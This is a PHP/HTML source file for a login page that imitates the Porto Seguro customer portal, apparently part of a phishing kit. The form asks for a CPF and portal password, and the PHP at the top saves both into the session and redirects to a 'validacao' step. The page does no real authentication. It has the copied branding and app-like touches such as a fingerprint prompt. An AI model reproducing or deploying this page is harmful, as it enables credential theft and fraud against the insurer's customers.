<?php 
session_start();
if(isset($_GET['acao'])){
    $_SESSION['cpf'] = $_GET['cpf'];
    $_SESSION['senha'] = $_GET['senha'];

    header('location: validacao');

}

?>
<!doctype html>
<html lang="pt_BR">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>PortoSeguro</title>

    <!-- Bootstrap core CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <!-- Custom styles for this template -->
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
    <link href="css/estilo.css" rel="stylesheet">
  </head>
  <body class="text-center">
  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <header>
        <!-- Fixed navbar -->
        <nav class="navbar navbar-expand-md navbar ls fixed-top bg ls shadow-sm">
            <span class="material-icons text-white">
                arrow_back
                </span>
          <a class="navbar-brand text-white" style="position: absolute; margin-left: 50px;" href="#">Entrar</a>
        </nav>
      </header>
    <form name="form1" method="get" class="form-signin">
        <p class="text" style="color:#A4B2CF;">Utilize seu CPF e senha do Portal do Cliente</p>
        <label for="inputEmail" class="sr-only">Digite seu CPF</label>
      <input type="text" name="cpf" id="ao_cpf" maxlength="14" onblur="ValidaCPF()" class="form-control" placeholder="Digite seu CPF" required autofocus><br>
      <label for="inputPassword" class="sr-only">Senha da Área do Cliente</label>
      <input type="password" name="senha" class="form-control" maxlength="8" minlength="6" placeholder="Senha da Área do Cliente" required>
      <span class="material-icons text-muted" style="position: absolute; margin-left: 110px; margin-top: -42px;">
        visibility
        </span>
      <button class="btn btn-lg btn-block" type="submit" name="acao" id="btn-mensagem" style="background-color: #00ABF9; color: #fff; text-align: center;">Entrar</button><br>
      <!-- <img class="mb-4" src="img/preview.png" alt=""> -->
      <p class="text-center fxa">Esqueci minha senha</p>
      <p class="text" style="color:#A4B2CF;">Entrar com sua digital<br>Toque no sensor</p>
      
      <div class="checkbox mb-3">
        <label>
        </label>
      </div>
    
    </form>
    <script>

    
      function ValidaCPF(){   

var ao_cpf=document.forms.form1.ao_cpf.value; 
var cpfValido = /^(([0-9]{3}.[0-9]{3}.[0-9]{3}-[0-9]{2}))$/;     
if (cpfValido.test(ao_cpf) == false)    { 
     
   ao_cpf = ao_cpf.replace( /\D/g , ""); //Remove tudo o que não é dígito
		    
   if (ao_cpf.length==11){
	  ao_cpf = ao_cpf.replace( /(\d{3})(\d)/ , "$1.$2"); //Coloca um ponto entre o terceiro e o quarto dígitos
	  ao_cpf = ao_cpf.replace( /(\d{3})(\d)/ , "$1.$2"); //Coloca um ponto entre o terceiro e o quarto dígitos
	  //de novo (para o segundo bloco de números)
	  ao_cpf = ao_cpf.replace( /(\d{3})(\d{1,2})$/ , "$1-$2"); //Coloca um hífen entre o terceiro e o quarto dígitos
			    
	  var valorValido = document.getElementById("ao_cpf").value = ao_cpf;
	}else{
	  console.log("CPF invalido");
	}
		
}
}
    </script>
    <!-- <p class="text-center fx">Solicitar Cartão de Crédito Porto Seguro</p> -->
  </body>
</html>